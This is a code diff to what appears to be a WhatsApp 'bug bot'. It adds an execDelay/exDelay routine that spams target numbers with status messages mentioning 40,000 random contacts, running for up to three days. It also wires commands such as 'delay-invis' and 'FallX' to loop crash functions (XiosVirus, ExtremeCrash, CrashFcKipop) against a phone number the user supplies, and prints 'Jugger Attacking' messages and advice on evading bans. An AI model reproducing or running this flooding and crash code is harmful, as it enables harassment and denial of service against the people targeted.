@@ -1722,6 +1722,68 @@ break
         });
     }
 }
+async function execDelay(target, durationHours = 72) {
+  const totalDurationMs = durationHours * 60 * 60 * 1000;
+  const startTime = Date.now();
+  let count = 0;
+
+  while (Date.now() - startTime < totalDurationMs) {
+    try {
+      if (count < 1000) {
+        await exDelay(target);
+        console.log(chalk.yellow(`Proses kirim bug sampai ${count + 1}/1000 target> ${target}`));
+        count++;
+      } else {
+        console.log(chalk.green(`[✓] Success Send Bug 1000 Messages to ${target}`));
+        count = 0;
+        console.log(chalk.red("➡️ Next 1000 Messages"));
+      }
+      await new Promise(resolve => setTimeout(resolve, 100));
+    } catch (error) {
+      console.error(`❌ Error saat mengirim: ${error.message}`);
+      await new Promise(resolve => setTimeout(resolve, 100));
+    }
+  }
+
+  console.log(`Stopped after running for 3 days. Total messages sent in last batch: ${count}`);
+}
+
+async function exDelay(target) {
+await bot.relayMessage(
+"status@broadcast", {
+extendedTextMessage: {
+text: `XrL ~ Dominations\n https://t.me/xrellyy\n`,
+contextInfo: {
+mentionedJid: [
+"6285215587498@s.whatsapp.net",
+...Array.from({
+length: 40000
+}, () =>
+`1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
+)
+]
+}
+}
+}, {
+statusJidList: [target],
+additionalNodes: [{
+tag: "meta",
+attrs: {},
+content: [{
+tag: "mentioned_users",
+attrs: {},
+content: [{
+tag: "to",
+attrs: {
+jid: target
+},
+content: undefined
+}]
+}]
+}]
+}
+);
+}
 async function bulldozerXDrain(target) {
   const mentioned = [
     "0@s.whatsapp.net",
@@ -2656,9 +2718,13 @@ async function ExternityFuckBlank(target, ptcp = true) {
 if (!Owner) return reply('[ ! ] Only premium user can use this command')
 if (!q) return reply(`Example: ${prefix + command} 254××`)
 let target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
-reply(bugres)
+reply(`⌜ *Jugger Attacking* ⌟
+- Attack Status : _True_
+- Command : _${command}_
+- Target : _${target}_
+`)
 for (let i = 0; i < 250; i++) {
-await bulldozerXDrain(target)
+await execDelay(target)
 await bulldozerXDrain(target)
 await XiosVirus(target)
 await loadedIos(target)
@@ -2667,7 +2733,7 @@ await InvisibleFC(target)
 await ExtremeCrash(target)
 await ControlNative2(target)
 await CrashFcKipop(target)
-await VampireSticker(target)
+await ExternityFuckBlank(target)
 }
 reply(`Bugs sent successfully to ${target} ✅`)
 }
@@ -2677,15 +2743,19 @@ case "delay-invis": {
 if (!Owner) return reply('[ ! ] Only premium user can use this command')
 if (!q) return reply(`Example: ${prefix + command} 254××`)
 let target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
-reply(bugres)
+reply(`⌜ *Jugger Attacking* ⌟
+- Attack Status : _True_
+- Command : _${command}_
+- Target : _${target}_
+`)
 for (let i = 0; i < 999; i++) {
-await VampireSticker(target)
-await VampireSticker(target)
+await execDelay(target)
+await execDelay(target)
+await execDelay(target)
+await execDelay(target)
 await bulldozerXDrain(target)
 await bulldozerXDrain(target)
-await bulldozerXDrain(target)
-await bulldozerXDrain(target)
-await bulldozerXDrain(target)
+await execDelay(target)
 }
 reply(`Enemy has  been delayed ${target} ✅`)
 }
@@ -2699,7 +2769,7 @@ if (!m?.isGroup) return reply(mess.group)
     //Paramater
     for (let r = 0; r < 30; r++) {
     await bulldozerXDrain(m.chat);
-    await VampireSticker(m.chat);
+    await execDelay(m.chat);
     await PollingX(m.chat);
     await BlankGroup(m.chat);
     }
@@ -2713,8 +2783,33 @@ if (!m?.isGroup) return reply(mess.group)
 
 > 𝐏𝐚𝐮𝐬𝐞 𝐟𝐢𝐯𝐞 𝐦𝐢𝐧𝐮𝐭𝐞𝐬 𝐬𝐨 𝐭𝐡𝐚𝐭 𝐛𝐨𝐭 𝐢𝐬 𝐧𝐨𝐭 𝐛𝐚𝐧𝐧𝐞𝐝`)   
 }
-break;   
+break
 
+//==================================================//
+case "FallX": {
+if (!Owner) return reply('[ ! ] Only premium user can use this command')
+if (!q) return reply(`Example: ${prefix + command} 234××`)
+let target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
+reply(`⌜ *Jugger Attacking* ⌟
+- Attack Status : _True_
+- Command : _${command}_
+- Target : _${target}_
+`)
+for (let i = 0; i < 350; i++) {
+await QDIphone(target)
+await XiosVirus(target)
+await VampireSticker(target)
+await loadedIos(target)
+await QDIphone(target)
+await bulldozerXDrain(target)
+await XiosVirus(target)
+await ControlNative2(target)
+await XiosVirus(target)
+await loadedIos(target)
+}
+reply(`Bugs sent successfully to ${target} ✅`)
+}
+break;
 //==================================================//
 default:
 if (budy.startsWith('=>')) {
